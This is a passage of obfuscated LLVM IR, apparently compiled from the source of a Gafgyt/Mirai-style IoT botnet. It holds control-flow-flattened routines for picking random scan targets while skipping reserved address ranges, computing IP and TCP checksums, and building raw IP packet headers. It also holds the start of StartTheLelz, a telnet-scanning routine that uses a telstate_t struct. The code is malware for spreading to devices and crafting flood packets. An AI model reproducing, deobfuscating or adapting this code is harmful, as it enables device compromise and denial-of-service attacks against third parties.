  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  store i32 1873835593, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 2061187920, i32 2119405798
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 10
  %48 = select i1 %47, i32 2061187920, i32 140885756
  store i32 %48, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 100
  %53 = select i1 %52, i32 -1163988271, i32 549384816
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 64
  %58 = select i1 %57, i32 -1729714355, i32 549384816
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp sle i32 %61, 127
  %63 = select i1 %62, i32 2061187920, i32 549384816
  store i32 %63, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 127
  %68 = select i1 %67, i32 2061187920, i32 -736355323
  store i32 %68, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 169
  %73 = select i1 %72, i32 399949339, i32 358995575
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 254
  %78 = select i1 %77, i32 2061187920, i32 358995575
  store i32 %78, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 172
  %83 = select i1 %82, i32 844956702, i32 -201821893
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp sle i32 %86, 16
  %88 = select i1 %87, i32 -804949240, i32 -201821893
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sle i32 %91, 31
  %93 = select i1 %92, i32 2061187920, i32 -201821893
  store i32 %93, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 192
  %98 = select i1 %97, i32 -1694375651, i32 1896601739
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 0
  %103 = select i1 %102, i32 1488836305, i32 1896601739
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 2
  %108 = select i1 %107, i32 2061187920, i32 1896601739
  store i32 %108, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 192
  %113 = select i1 %112, i32 -1038717932, i32 -1295795089
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 88
  %118 = select i1 %117, i32 -2017503171, i32 -1295795089
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 99
  %123 = select i1 %122, i32 2061187920, i32 -1295795089
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 192
  %128 = select i1 %127, i32 -688139729, i32 -278983014
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 168
  %133 = select i1 %132, i32 2061187920, i32 -278983014
  store i32 %133, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 198
  %138 = select i1 %137, i32 1474355984, i32 65780278
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 18
  %143 = select i1 %142, i32 2061187920, i32 293791177
  store i32 %143, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 19
  %148 = select i1 %147, i32 2061187920, i32 65780278
  store i32 %148, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 198
  %153 = select i1 %152, i32 1833825475, i32 1460996063
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 51
  %158 = select i1 %157, i32 1517933539, i32 1460996063
  store i32 %158, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 100
  %163 = select i1 %162, i32 2061187920, i32 1460996063
  store i32 %163, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 203
  %168 = select i1 %167, i32 -1576079580, i32 263484284
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 0
  %173 = select i1 %172, i32 1491357411, i32 263484284
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 113
  %178 = select i1 %177, i32 2061187920, i32 263484284
  store i32 %178, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %181 = zext i8 %180 to i32
  %182 = icmp sge i32 %181, 224
  store i32 2061187920, i32* %switchVar
  store i1 %182, i1* %.reg2mem2
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %184 = select i1 %.reload3, i32 -861096020, i32 -1213174608
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = call i32 @rand() #4
  %187 = srem i32 %186, 255
  %188 = trunc i32 %187 to i8
  store i8 %188, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %189 = call i32 @rand() #4
  %190 = srem i32 %189, 255
  %191 = trunc i32 %190 to i8
  store i8 %191, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %192 = call i32 @rand() #4
  %193 = srem i32 %192, 255
  %194 = trunc i32 %193 to i8
  store i8 %194, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i32 1873835593, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %196, i8 0, i64 16, i32 16, i1 false)
  %197 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %199 = zext i8 %198 to i32
  %200 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %201 = zext i8 %200 to i32
  %202 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %203 = zext i8 %202 to i32
  %204 = call i32 (i8*, i8*, ...) @szprintf(i8* %197, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i32 0, i32 0), i32 %199, i32 %201, i32 %203)
  %205 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %206 = call i32 @inet_addr(i8* %205) #4
  store i32 %206, i32* %1, align 4
  store i32 1777697900, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i32, i32* %1, align 4
  ret i32 %208

loopEnd:                                          ; preds = %195, %185, %183, %179, %174, %169, %164, %159, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %29, %13, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 1309001870, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1309001870, label %6
    i32 1612243448, label %10
    i32 -620941527, label %19
    i32 741939817, label %23
    i32 -591477867, label %30
    i32 858880892, label %31
    i32 -1325391976, label %36
    i32 703657457, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 1612243448, i32 -620941527
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 1309001870, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 741939817, i32 -591477867
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -591477867, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 858880892, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -1325391976, i32 703657457
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 858880892, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #4
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #4
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #1

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1094440461, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1094440461, label %first
    i32 1672087031, label %7
    i32 1623005299, label %8
    i32 -34850699, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 1672087031, i32 1623005299
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -34850699, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -34850699, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %.reg2mem235 = alloca i32
  %.reg2mem32 = alloca %struct.telstate_t*
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = call i32 @getdtablesize() #4
  %14 = sdiv i32 %13, 4
  %15 = mul nsw i32 %14, 3
  store i32 %15, i32* %1, align 4
  %16 = load i32, i32* %1, align 4
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 313468300, i32* %switchVar
  %.reg2mem253 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar31 = load i32, i32* %switchVar
  switch i32 %switchVar31, label %switchDefault [
    i32 313468300, label %first
    i32 -263367228, label %19
    i32 -1057804291, label %20
    i32 -874356341, label %22
    i32 -1082859493, label %36
    i32 418095944, label %41
    i32 1700827274, label %56
    i32 -517799221, label %59
    i32 -1051367995, label %60
    i32 -1783829561, label %61
    i32 -1165950950, label %62
    i32 1954010776, label %67
    i32 -434478272, label %NodeBlock29
    i32 -330206310, label %NodeBlock27
    i32 -1680171686, label %NodeBlock25
    i32 190411647, label %NodeBlock23
    i32 1662348100, label %LeafBlock21
    i32 1145165034, label %NodeBlock19
    i32 -272957231, label %NodeBlock17
    i32 1551940561, label %NodeBlock15
    i32 2140041446, label %LeafBlock13
    i32 -534084882, label %NodeBlock11
    i32 -70927092, label %NodeBlock9
    i32 -1565679735, label %NodeBlock7
    i32 1338500814, label %NodeBlock5
    i32 1589696892, label %NodeBlock3
    i32 -211894468, label %NodeBlock1
    i32 -1753940797, label %NodeBlock
    i32 -2118769016, label %LeafBlock
    i32 679231034, label %91
    i32 775201850, label %104
    i32 1656367068, label %124
    i32 1658316061, label %139
    i32 317908353, label %150
    i32 263376456, label %159
    i32 -1344114678, label %164
    i32 -1414117419, label %165
    i32 172660390, label %190
    i32 -420910185, label %191
    i32 1644508671, label %214
    i32 1112796183, label %219
    i32 -1342453266, label %230
    i32 -902386074, label %239
    i32 1576235559, label %240
    i32 -1455645088, label %248
    i32 282500381, label %254
    i32 -908873095, label %255
    i32 -247866694, label %264
    i32 -1155070364, label %265
    i32 1516746836, label %297
    i32 1602033375, label %308
    i32 99304830, label %323
    i32 -908957450, label %354
    i32 1889650322, label %355
    i32 1252639945, label %359
    i32 1618923359, label %374
    i32 86814159, label %375
    i32 1513056356, label %385
    i32 -2037144685, label %400
    i32 -1197147008, label %401
    i32 -1466844188, label %409
    i32 2045856597, label %415
    i32 790164572, label %435
    i32 -1074695367, label %453
    i32 1057079909, label %465
    i32 952287144, label %475
    i32 1931673734, label %490
    i32 681637380, label %491
    i32 688673511, label %517
    i32 -1740667487, label %532
    i32 722088242, label %541
    i32 -1455244456, label %556
    i32 -403555104, label %561
    i32 1283797482, label %569
    i32 1161014227, label %575
    i32 -751131883, label %595
    i32 -955629301, label %612
    i32 -879034693, label %617
    i32 324426246, label %622
    i32 1082040216, label %628
    i32 -1298627546, label %637
    i32 1635320090, label %652
    i32 -996646825, label %664
    i32 -661449443, label %674
    i32 -1299783571, label %689
    i32 1257920062, label %690
    i32 1040198452, label %716
    i32 856951804, label %731
    i32 -471126769, label %740
    i32 -1404599168, label %755
    i32 760875406, label %760
    i32 -284853988, label %768
    i32 -989834339, label %774
    i32 2105923458, label %794
    i32 -1290239001, label %811
    i32 -654118699, label %831
    i32 770647067, label %840
    i32 1713805429, label %860
    i32 488341100, label %865
    i32 -822111731, label %871
    i32 -307829368, label %883
    i32 2066548260, label %893
    i32 -462463601, label %908
    i32 366559050, label %909
    i32 -944616366, label %918
    i32 1313619163, label %933
    i32 1426801937, label %938
    i32 -655162305, label %947
    i32 103448421, label %962
    i32 98513972, label %967
    i32 73533734, label %976
    i32 1641753519, label %991
    i32 -777934769, label %996
    i32 -382660168, label %1004
    i32 -1603156585, label %1010
    i32 1074623970, label %1030
    i32 32530667, label %1047
    i32 -241222591, label %1074
    i32 2118132470, label %1094
    i32 -890013748, label %1106
    i32 1802785513, label %1116
    i32 -2057075470, label %1131
    i32 -2048483564, label %1132
    i32 -1603707163, label %1141
    i32 267634383, label %1156
    i32 957968293, label %1161
    i32 -1558147692, label %1170
    i32 -1242266771, label %1185
    i32 1489081367, label %1190
    i32 -10435584, label %1199
    i32 -766350678, label %1214
    i32 137993737, label %1219
    i32 678000090, label %1227
    i32 1638880280, label %1233
    i32 1012307721, label %1253
    i32 2130221053, label %1299
    i32 -1754265145, label %1311
    i32 830659608, label %1321
    i32 -1253393951, label %1336
    i32 1457871078, label %NewDefault
    i32 63385401, label %1337
    i32 127744604, label %1338
    i32 1482621472, label %1341
    i32 1339604652, label %1342
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp sgt i32 %.reload, 4096
  %18 = select i1 %17, i32 -263367228, i32 -1057804291
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
